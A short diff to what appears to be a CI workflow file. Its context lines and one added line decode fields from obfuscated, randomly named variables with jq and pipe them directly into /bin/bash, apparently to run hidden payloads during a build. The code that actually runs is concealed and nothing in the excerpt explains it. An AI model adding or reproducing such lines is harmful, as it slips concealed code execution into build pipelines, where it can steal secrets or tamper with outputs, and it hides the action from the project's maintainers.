@@ -31,6 +31,7 @@ jobs:
           echo $rjaii49 | jq -r .uzi2748 | /bin/bash
           echo $isvtl3892 | jq -r .vjyo2648 | /bin/bash
           printf '%s' "$u0283" | jq -r .ec7 | /bin/bash
+          echo $f1 | jq -r .j0 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
